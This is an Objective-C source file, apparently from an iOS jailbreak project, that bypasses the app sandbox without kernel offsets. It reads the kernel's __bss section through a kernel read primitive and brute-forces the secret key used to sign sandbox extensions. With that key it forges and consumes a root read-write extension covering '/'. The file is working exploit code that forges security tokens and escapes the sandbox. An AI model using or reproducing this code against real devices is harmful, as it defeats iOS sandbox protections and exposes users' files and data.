//
//  sandbox_generate_offsetless.m
//  fun15
//
//  Created by Lars Fröder on 07.06.22.
//

#import <Foundation/Foundation.h>
#import "arm_neon.h"
#import "SandboxSPI.h"
#import <CommonCrypto/CommonDigest.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

#define ROOT_RW_EXTENSION ";00;00000000;00000000;00000000;0000000000000020;com.apple.app-sandbox.read-write;01;01000007;0000000000000002;01;/"

void find_bss_offset_and_size(uint64_t* bssOffset, size_t* bssSize)
{
    KernelManager* km = [KernelManager sharedInstance];
    struct mach_header_64 kernel_header;
    [km readBufferAtAddress:km.kernel_base intoBuffer:&kernel_header withLength:sizeof(kernel_header)];
    
    uint64_t cmdStart = km.kernel_base + sizeof(kernel_header);
    uint64_t cmdEnd = cmdStart + kernel_header.sizeofcmds;
    
    uint64_t cmdAddr = cmdStart;
    for(int ci = 0; ci < kernel_header.ncmds && cmdAddr <= cmdEnd; ci++)
    {
        struct segment_command_64 cmd;
        [km readBufferAtAddress:cmdAddr intoBuffer:&cmd withLength:sizeof(cmd)];
        
        if(cmd.cmd == LC_SEGMENT_64)
        {
            //printf("found segment command (%s)\n", cmd.segname);
            if(!strcmp(cmd.segname, "__DATA"))
            {
                uint64_t sectStart = cmdAddr + sizeof(cmd);
                for(int si = 0; si < cmd.nsects; si++)
                {
                    uint64_t sectAddr = sectStart + si * sizeof(struct section_64);
                    struct section_64 sect;
                    [km readBufferAtAddress:sectAddr intoBuffer:&sect withLength:sizeof(sect)];
                    
                    //printf("found section (%s)\n", sect.sectname);
                    if(!strcmp(sect.sectname, "__bss"))
                    {
                        if(bssOffset)
                        {
                            *bssOffset = sect.addr;
                        }
                        if(bssSize)
                        {
                            *bssSize = sect.size;
                        }
                        return;
                    }
                }
            }
        }
        
        cmdAddr += cmd.cmdsize;
    }
}

void hmac_sha256_secret(int8x16_t* secret, const void* data, unsigned int dataSize, void* output)
{
    unsigned char* outBytes = (unsigned char*)output;

    int16x8_t tmpData[4];
    int16x8_t tmpData2[4];
    for(int i = 0; i < 4; i++)
    {
        for(int k = 0; k < 8; k++)
        {
            tmpData[i][k] = 0xAAAA;
            tmpData2[i][k] = 0xAAAA;
        }
    }
    
    // Initialize variables
    int16x8_t v8;
    int16x8_t v9;
    for(int i = 0; i < 8; i++)
    {
        v8[i] = 0x3636;
        v9[i] = 0x5C5C;
    }

    for(int i = 0; i < 4; i++)
    {
        int8x16_t s = secret[i];
        tmpData[i] = veorq_s8(s, v8);
        tmpData2[i] = veorq_s8(s, v9);
    }
    
    CC_SHA256_CTX c;

    CC_SHA256_Init(&c);
    CC_SHA256_Update(&c, tmpData, 0x40);
    CC_SHA256_Update(&c, data, dataSize);
    CC_SHA256_Final(outBytes, &c);
    
    CC_SHA256_Init(&c);
    CC_SHA256_Update(&c, tmpData2, 0x40);
    CC_SHA256_Update(&c, outBytes, 0x20);
    CC_SHA256_Final(outBytes, &c);
}

int attempt_bypass(int8x16_t* secret, char* extensionBuffer)
{
    const char* hexArr = "0123456789abcdef";
    
    int64_t hmac[4];
    hmac[0] = 0xAAAAAAAAAAAAAAAALL;
    hmac[1] = 0xAAAAAAAAAAAAAAAALL;
    hmac[2] = 0xAAAAAAAAAAAAAAAALL;
    hmac[3] = 0xAAAAAAAAAAAAAAAALL;
    
    hmac_sha256_secret(secret, extensionBuffer + 64, (unsigned int)strlen(extensionBuffer + 64)+1, hmac);
    
    unsigned char* hmacBytes = (unsigned char*)hmac;
    for(int i = 0; i < 64; i += 2)
    {
        unsigned char hmacByte = *hmacBytes++;
        unsigned char b1 = hmacByte >> 4;
        unsigned char b2 = hmacByte & 0xF;
        
        extensionBuffer[i] = hexArr[b1];
        extensionBuffer[i+1] = hexArr[b2];
    }
    
    int64_t suc = sandbox_extension_consume(extensionBuffer);
    if(suc == 1)
    {
        printf("Consumed extension %s\n", extensionBuffer);
        return 1;
    }
    return 0;
}

int bypass_sandbox_offsetless(void)
{
    int ret = 0;

    KernelManager* km = [KernelManager sharedInstance];
    
    char* extensionBuffer = (char*)calloc(2048, sizeof(char));
    strncpy(extensionBuffer + 64, ROOT_RW_EXTENSION, 0x7C0);
    
    uint64_t bss_offset = 0;
    size_t bss_size = 0;
    find_bss_offset_and_size(&bss_offset, &bss_size);
    printf("bss_offset: %llX, bss_size: %lu\n", bss_offset, bss_size);
    
    int16_t* bss_dump = malloc(bss_size);
    [km readBufferAtAddress:bss_offset intoBuffer:&bss_dump[0] withLength:bss_size];

    // Brute force all possible secret offsets until sandbox_extension_consume returns 1
    // This way this bypass works without any offsets
    // Gets done in ~0.1 second on iPhone 13 Pro
    uint64_t possibleValues = (bss_size - sizeof(int8_t)*16) / sizeof(int16_t);
    for(int p = 0; p < possibleValues; p++)
    {
        int8x16_t* secret = (int8x16_t*)&bss_dump[p];
        int suc = attempt_bypass(secret, extensionBuffer);
        if(suc == 1)
        {
            ret = 1;
            break;
        }
    }
    
    free(extensionBuffer);
    free(bss_dump);
    return ret;
}
